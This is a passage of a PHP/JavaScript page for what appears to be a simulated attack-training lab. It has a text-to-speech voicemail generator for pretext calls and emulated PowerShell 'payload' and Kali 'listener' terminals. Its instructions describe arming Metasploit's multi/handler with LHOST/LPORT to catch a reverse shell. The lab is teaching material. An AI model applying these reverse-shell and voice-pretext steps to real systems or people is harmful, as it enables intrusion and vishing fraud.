                <?php endforeach; ?>
            </select>
            <p id="voicemail-voice-info" class="voicemail-status" aria-live="polite">
                <?= h(reset($voicePresets)['label'] ?? 'Voice preset applied.'); ?>
            </p>
        <?php endif; ?>
        <details class="voicemail-advanced">
            <summary>Advanced controls</summary>
            <div class="voicemail-advanced-grid">
                <label>
                    Speaking rate (0.7 - 1.3)
                    <input type="number" step="0.01" min="0.7" max="1.3" id="voicemail-rate" name="speaking_rate" value="<?= h((string)$defaultSpeakingRate) ?>">
                </label>
                <label>
                    Pitch (-10 to 10)
                    <input type="number" step="0.1" min="-10" max="10" id="voicemail-pitch" name="pitch" value="<?= h((string)$defaultPitch) ?>">
                </label>
                <label>
                    Audio encoding
                    <select id="voicemail-encoding" name="audio_encoding">
                        <option value="MP3" <?= $defaultEncoding === 'MP3' ? 'selected' : '' ?>>MP3</option>
                        <option value="OGG_OPUS" <?= $defaultEncoding === 'OGG_OPUS' ? 'selected' : '' ?>>OGG/Opus</option>
                        <option value="LINEAR16" <?= $defaultEncoding === 'LINEAR16' ? 'selected' : '' ?>>LINEAR16 (WAV)</option>
                    </select>
                </label>
                <label>
                    Effects profile
                    <select id="voicemail-effects" name="effects_profile">
                        <option value="" <?= $defaultEffectsProfile === '' ? 'selected' : '' ?>>Default</option>
                        <option value="telephony-class-application" <?= $defaultEffectsProfile === 'telephony-class-application' ? 'selected' : '' ?>>Telephony</option>
                        <option value="wearable-class-device" <?= $defaultEffectsProfile === 'wearable-class-device' ? 'selected' : '' ?>>Wearable</option>
                        <option value="handset-class-device" <?= $defaultEffectsProfile === 'handset-class-device' ? 'selected' : '' ?>>Handset</option>
                    </select>
                </label>
            </div>
        </details>
        <div class="voicemail-actions">
            <button type="submit">Generate voicemail</button>
            <span id="voicemail-status" class="voicemail-status"></span>
        </div>
        <audio id="voicemail-audio" controls hidden></audio>
    </form>
</section>
<section class="panel">
    <div>
        <h2>Start Listener</h2>
        <p>
            Bring up a simulated Kali terminal and arm <code class="command-hint">msfconsole</code> to catch the returning shell.
            Configure the multi/handler module with the same callback IP/port you embedded in the payload,
            then keep the listener running while the mission plays out.
        </p>
        <ol>
            <li>Launch <code class="command-hint">msfconsole</code> and load <code class="command-hint">use exploit/multi/handler</code>.</li>
            <li>Inspect <code class="command-hint">info</code> / <code class="command-hint">options</code>, then <code class="command-hint">set LHOST</code> and <code class="command-hint">set LPORT</code>.</li>
            <li>Run the handler with <code class="command-hint">run</code> (or <code class="command-hint">exploit</code>) and leave it waiting for the reverse shell.</li>
        </ol>
    </div>
    <div class="terminal-card">
        <div class="terminal-toolbar">
            <span class="indicator"></span>
            <span class="indicator yellow"></span>
            <span class="indicator green"></span>
            <span class="terminal-title">kali-listener</span>
        </div>
        <div id="listener-terminal" class="terminal-window" aria-label="Listener terminal"></div>
    </div>
</section>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
<script>
(() => {
    const form = document.getElementById('voicemail-form');
    if (!form) return;
    const textarea = document.getElementById('voicemail-script');
    const statusEl = document.getElementById('voicemail-status');
    const audioEl = document.getElementById('voicemail-audio');
    const submitBtn = form.querySelector('button[type="submit"]');
    const voiceSelect = document.getElementById('voicemail-voice');
    const voiceInfo = document.getElementById('voicemail-voice-info');
    const rateInput = document.getElementById('voicemail-rate');
    const pitchInput = document.getElementById('voicemail-pitch');
    const encodingSelect = document.getElementById('voicemail-encoding');
    const effectsSelect = document.getElementById('voicemail-effects');

    const applyPresetSettings = () => {
        if (!voiceSelect) return;
        const option = voiceSelect.options[voiceSelect.selectedIndex];
        if (!option) return;
        if (voiceInfo) {
            voiceInfo.textContent = option.dataset.description || '';
        }
        if (rateInput && option.dataset.rate) {
            rateInput.value = option.dataset.rate;
        }
        if (pitchInput && option.dataset.pitch) {
            pitchInput.value = option.dataset.pitch;
        }
        if (encodingSelect && option.dataset.encoding) {
            encodingSelect.value = option.dataset.encoding;
        }
        if (effectsSelect && typeof option.dataset.effects !== 'undefined') {
            effectsSelect.value = option.dataset.effects;
        }
    };

    if (voiceSelect) {
        applyPresetSettings();
        voiceSelect.addEventListener('change', applyPresetSettings);
    }

    form.addEventListener('submit', (event) => {
        event.preventDefault();
        const script = textarea.value.trim();
        if (!script) {
            statusEl.textContent = 'Please enter a voicemail script.';
            return;
        }
        submitBtn.disabled = true;
        statusEl.textContent = 'Synthesizing via Google Cloud Text-to-Speech...';
        audioEl.hidden = true;
        const payload = {
            script,
            speaking_rate: document.getElementById('voicemail-rate')?.value || '1.0',
            pitch: document.getElementById('voicemail-pitch')?.value || '0',
            audio_encoding: document.getElementById('voicemail-encoding')?.value || 'MP3',
            effects_profile: document.getElementById('voicemail-effects')?.value || '',
        };
        if (voiceSelect) {
            payload.voice_preset = voiceSelect.value;
        }
        window.fetch('/tts.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(payload),
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (data.error) {
                    statusEl.textContent = data.error;
                    return;
                }
                const src = `data:${data.mime};base64,${data.audio}`;
                audioEl.src = src;
                audioEl.hidden = false;
                audioEl.play().catch(() => {});
                statusEl.textContent = 'Voicemail ready.';
            })
            .catch(() => {
                statusEl.textContent = 'Unable to reach the TTS service.';
            })
            .finally(() => {
                submitBtn.disabled = false;
            });
    });
})();

(() => {
    document.querySelectorAll('.copy-cmd').forEach((button) => {
        button.addEventListener('click', () => {
            const command = button.dataset.command || '';
            if (!command) return;
            navigator.clipboard?.writeText(command).then(() => {
                button.classList.add('copied');
                setTimeout(() => button.classList.remove('copied'), 1200);
            }).catch(() => {});
        });
    });
})();

(() => {
    const payloadContainer = document.getElementById('payload-terminal');
    if (!payloadContainer) return;
    const FitAddonClass = window.FitAddon?.FitAddon || window.fitAddon?.FitAddon;
    const psTerm = new window.Terminal({
        theme: {
            background: '#05060a',
            foreground: '#e2f3ff',
            cursor: '#00ffc6',
        },
        fontSize: 14,
        rows: 18,
        convertEol: false,
    });
    psTerm.open(payloadContainer);
    if (FitAddonClass) {
        const payloadFit = new FitAddonClass();
        psTerm.loadAddon(payloadFit);
        payloadFit.fit();
        window.addEventListener('resize', () => payloadFit.fit());
    }
    psTerm.writeln('Windows PowerShell');
    psTerm.writeln('Copyright (C) Microsoft Corporation. All rights reserved.');
    psTerm.writeln('');

    const payloadPrompt = 'PS C:\\Users\\Deep\\Desktop> ';
    let payloadBuffer = '';
    const payloadHistory = [];
    let payloadHistoryIndex = 0;
    let payloadAwaitingScriptInput = false;
    let payloadRowsRendered = 0;
    let payloadPromptText = payloadPrompt;

    const moveCursorToPayloadStart = () => {
        if (payloadRowsRendered > 0) {
            psTerm.write(`\x1b[${payloadRowsRendered}F`);
        }
        psTerm.write('\r');
    };

    const clearPayloadRendered = () => {
        moveCursorToPayloadStart();
        for (let i = 0; i <= payloadRowsRendered; i++) {
            psTerm.write('\x1b[2K\r');
            if (i < payloadRowsRendered) {
                psTerm.write('\x1b[1B');
            }
        }
        if (payloadRowsRendered > 0) {
            psTerm.write(`\x1b[${payloadRowsRendered}A`);
        }
    };

    const currentPayloadPrompt = () => payloadPromptText;

    const renderPayloadLine = () => {
        clearPayloadRendered();
        const promptText = currentPayloadPrompt();
        psTerm.write(`${promptText}${payloadBuffer}`);
        const cols = psTerm.cols || 80;
        payloadRowsRendered = Math.floor((promptText.length + payloadBuffer.length) / cols);
    };

    const writePayloadPrompt = (prependNewline = false) => {
        payloadBuffer = '';
        payloadHistoryIndex = payloadHistory.length;
        payloadRowsRendered = 0;
        if (prependNewline) {
            psTerm.write('\r\n');
        }
        psTerm.write(currentPayloadPrompt());
    };

    writePayloadPrompt(false);

    psTerm.onPaste?.((data) => {
        if (!data) return;
        payloadBuffer += data.replace(/\r/g, '');
        renderPayloadLine();
    });

    const sendPayloadCommand = (command) => {
        window.fetch('/simulation.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({command, target: 'payload'}),
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (data.clear) {
                    psTerm.clear();
                }
                if (data.output) {
                    psTerm.writeln(data.output);
                }
                const awaiting = !!data.awaiting_prompt;
                if (data.prompt_text) {
                    payloadPromptText = data.prompt_text;
                } else if (!awaiting) {
                    payloadPromptText = payloadPrompt;
                }
                payloadAwaitingScriptInput = awaiting;
                if (payloadAwaitingScriptInput) {
                    payloadBuffer = '';
                    payloadHistoryIndex = payloadHistory.length;
                    payloadRowsRendered = 0;
                    renderPayloadLine();
                }
            })
            .catch(() => {
                psTerm.writeln('Error: unable to reach the payload lab.');
                payloadAwaitingScriptInput = false;
            })
            .finally(() => {
                if (!payloadAwaitingScriptInput) {
                    payloadPromptText = payloadPrompt;
                    writePayloadPrompt(false);
                } else {
                    payloadBuffer = '';
                    payloadHistoryIndex = payloadHistory.length;
                }
            });
    };

    psTerm.onKey(({key, domEvent}) => {
        const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;
        if (domEvent.key === 'Enter') {
            domEvent.preventDefault();
            const commandText = payloadBuffer;
            const activePrompt = currentPayloadPrompt();
            clearPayloadRendered();
            if (activePrompt) {
                psTerm.write(`${activePrompt}${commandText}\r\n`);
            } else if (commandText.length > 0) {
                psTerm.write(`${commandText}\r\n`);
            } else {
                psTerm.write('\r\n');
            }
            const rawCommand = payloadBuffer;
            const trimmed = rawCommand.trim();
            if (trimmed.length === 0 && !payloadAwaitingScriptInput) {
                writePayloadPrompt(false);
                return;
            }
            if (trimmed.length > 0) {
                payloadHistory.push(trimmed);
                payloadHistoryIndex = payloadHistory.length;
            }
            sendPayloadCommand(rawCommand);
        } else if (domEvent.key === 'Backspace') {
            domEvent.preventDefault();
            if (payloadBuffer.length > 0) {
                payloadBuffer = payloadBuffer.slice(0, -1);
                renderPayloadLine();
            }
        } else if (domEvent.key === 'ArrowUp') {
            domEvent.preventDefault();
            if (payloadHistory.length === 0) {
                return;
            }
            if (payloadHistoryIndex > 0) {
                payloadHistoryIndex -= 1;
            }
            payloadBuffer = payloadHistory[payloadHistoryIndex] ?? '';
            renderPayloadLine();
        } else if (domEvent.key === 'ArrowDown') {
            domEvent.preventDefault();
            if (payloadHistoryIndex < payloadHistory.length - 1) {
                payloadHistoryIndex += 1;
                payloadBuffer = payloadHistory[payloadHistoryIndex] ?? '';
            } else {
                payloadHistoryIndex = payloadHistory.length;
                payloadBuffer = '';
            }
            renderPayloadLine();
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'c') {
            domEvent.preventDefault();
            payloadBuffer = '';
            payloadHistoryIndex = payloadHistory.length;
            window.fetch('/simulation.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({command: '__CTRL_C__', target: 'payload'}),
            })
                .then((resp) => resp.json())
                .then((data) => {
                    if (data.clear) {
                        psTerm.clear();
                    }
                    if (data.output) {
                        psTerm.writeln(data.output);
                    }
                })
                .catch(() => {
                    psTerm.writeln('Error: unable to reach the payload lab.');
                })
                .finally(() => {
                payloadAwaitingScriptInput = false;
                payloadPromptText = payloadPrompt;
                writePayloadPrompt(false);
                });
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'v') {
            if (navigator.clipboard?.readText) {
                navigator.clipboard.readText().then((text) => {
                    if (!text) return;
                    payloadBuffer += text.replace(/\r/g, '');
                    renderPayloadLine();
                }).catch(() => {});
            }
        } else if (printable && key.length === 1) {
            payloadBuffer += key;
            renderPayloadLine();
        }
    });
})();

(() => {
    const listenerContainer = document.getElementById('listener-terminal');
    if (!listenerContainer) return;
    const FitAddonClass = window.FitAddon?.FitAddon || window.fitAddon?.FitAddon;
    const listenerTerm = new window.Terminal({
        theme: {
            background: '#03080f',
            foreground: '#e2f3ff',
            cursor: '#00ffc6',
        },
        fontSize: 14,
        rows: 18,
        convertEol: false,
    });
    listenerTerm.open(listenerContainer);
    if (FitAddonClass) {
        const listenerFit = new FitAddonClass();
        listenerTerm.loadAddon(listenerFit);
        listenerFit.fit();
        window.addEventListener('resize', () => listenerFit.fit());
    }

    const shellHeader = '┌──(kali㉿kali)-[~/tmp]';
    const shellPrompt = '└─$ ';
    let listenerPromptText = shellPrompt;
    let listenerBuffer = '';
    const listenerHistory = [];
    let listenerHistoryIndex = 0;
    let listenerRowsRendered = 0;
    let listenerAwaitingPrompt = false;

    const moveCursorToListenerStart = () => {
        if (listenerRowsRendered > 0) {
            listenerTerm.write(`\x1b[${listenerRowsRendered}F`);
        }
        listenerTerm.write('\r');
    };

    const clearListenerRendered = () => {
        moveCursorToListenerStart();
        for (let i = 0; i <= listenerRowsRendered; i++) {
            listenerTerm.write('\x1b[2K\r');
            if (i < listenerRowsRendered) {
                listenerTerm.write('\x1b[1B');
            }
        }
        if (listenerRowsRendered > 0) {
            listenerTerm.write(`\x1b[${listenerRowsRendered}A`);
        }
    };

    const renderListenerLine = () => {
        clearListenerRendered();
        const promptText = listenerPromptText ?? '';
        listenerTerm.write(`${promptText}${listenerBuffer}`);
        const cols = listenerTerm.cols || 80;
        listenerRowsRendered = Math.floor(((promptText.length) + listenerBuffer.length) / cols);
    };

    const writeListenerPrompt = (prependNewline = false) => {
        listenerBuffer = '';
        listenerHistoryIndex = listenerHistory.length;
        listenerRowsRendered = 0;
        if (prependNewline) {
            listenerTerm.write('\r\n');
        }
        if (!listenerAwaitingPrompt && listenerPromptText === shellPrompt) {
            listenerTerm.writeln(shellHeader);
        }
        if (listenerPromptText) {
            listenerTerm.write(listenerPromptText);
        }
    };

    writeListenerPrompt(false);

    listenerTerm.onPaste?.((data) => {
        if (!data) return;
        listenerBuffer += data.replace(/\r/g, '');
        renderListenerLine();
    });

    const sendListenerCommand = (command) => {
        window.fetch('/simulation.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({command, target: 'listener'}),
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (data.clear) {
                    listenerTerm.clear();
                }
                if (data.output) {
                    listenerTerm.writeln(data.output);
                }
                const awaiting = !!data.awaiting_prompt;
                if (typeof data.prompt_text === 'string' && data.prompt_text !== null) {
                    listenerPromptText = data.prompt_text;
                } else if (!awaiting) {
                    listenerPromptText = shellPrompt;
                }
                listenerAwaitingPrompt = awaiting;
            })
            .catch(() => {
                listenerTerm.writeln('Error: unable to reach the listener lab.');
                listenerAwaitingPrompt = false;
                listenerPromptText = shellPrompt;
            })
            .finally(() => {
                if (!listenerAwaitingPrompt) {
                    writeListenerPrompt(false);
                } else {
                    listenerBuffer = '';
                    listenerHistoryIndex = listenerHistory.length;
                    listenerRowsRendered = 0;
                }
            });
    };

    listenerTerm.onKey(({key, domEvent}) => {
        const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;
        if (domEvent.key === 'Enter') {
            domEvent.preventDefault();
            const commandText = listenerBuffer;
            const activePrompt = listenerPromptText || '';
            clearListenerRendered();
            if (activePrompt) {
                listenerTerm.write(`${activePrompt}${commandText}\r\n`);
            } else if (commandText.length > 0) {
                listenerTerm.write(`${commandText}\r\n`);
            } else {
                listenerTerm.write('\r\n');
            }
            const rawCommand = listenerBuffer;
            const trimmed = rawCommand.trim();
            if (trimmed.length === 0) {
                if (!listenerAwaitingPrompt) {
                    writeListenerPrompt(false);
                }
                return;
            }
            listenerHistory.push(trimmed);
            listenerHistoryIndex = listenerHistory.length;
            sendListenerCommand(rawCommand);
        } else if (domEvent.key === 'Backspace') {
            domEvent.preventDefault();
            if (listenerBuffer.length > 0) {
                listenerBuffer = listenerBuffer.slice(0, -1);
                renderListenerLine();
            }
        } else if (domEvent.key === 'ArrowUp') {
            domEvent.preventDefault();
            if (listenerHistory.length === 0) {
                return;
            }
            if (listenerHistoryIndex > 0) {
                listenerHistoryIndex -= 1;
            }
            listenerBuffer = listenerHistory[listenerHistoryIndex] ?? '';
            renderListenerLine();
        } else if (domEvent.key === 'ArrowDown') {
            domEvent.preventDefault();
            if (listenerHistoryIndex < listenerHistory.length - 1) {
                listenerHistoryIndex += 1;
                listenerBuffer = listenerHistory[listenerHistoryIndex] ?? '';
            } else {
                listenerHistoryIndex = listenerHistory.length;
                listenerBuffer = '';
            }
            renderListenerLine();
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'c') {
            domEvent.preventDefault();
            listenerBuffer = '';
            listenerHistoryIndex = listenerHistory.length;
            window.fetch('/simulation.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({command: '__CTRL_C__', target: 'listener'}),
            })
                .then((resp) => resp.json())
                .then((data) => {
                    if (data.clear) {
                        listenerTerm.clear();
                    }
                    if (data.output) {
                        listenerTerm.writeln(data.output);
                    }
                    if (typeof data.prompt_text === 'string') {
                        listenerPromptText = data.prompt_text;
                    } else {
                        listenerPromptText = shellPrompt;
                    }
                    listenerAwaitingPrompt = !!data.awaiting_prompt;
                })
                .catch(() => {
                    listenerTerm.writeln('Error: unable to reach the listener lab.');
                    listenerAwaitingPrompt = false;
                })
                .finally(() => {
                    if (!listenerAwaitingPrompt) {
                        writeListenerPrompt(false);
                    } else {
                        listenerBuffer = '';
                        listenerHistoryIndex = listenerHistory.length;
                    }
                });
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'v') {
            if (navigator.clipboard?.readText) {
                navigator.clipboard.readText().then((text) => {
                    if (!text) return;
                    listenerBuffer += text.replace(/\r/g, '');
                    renderListenerLine();
                }).catch(() => {});
            }
        } else if (printable && key.length === 1) {
            listenerBuffer += key;
            renderListenerLine();
        }
    });
})();
</script>
<?php
render_footer();

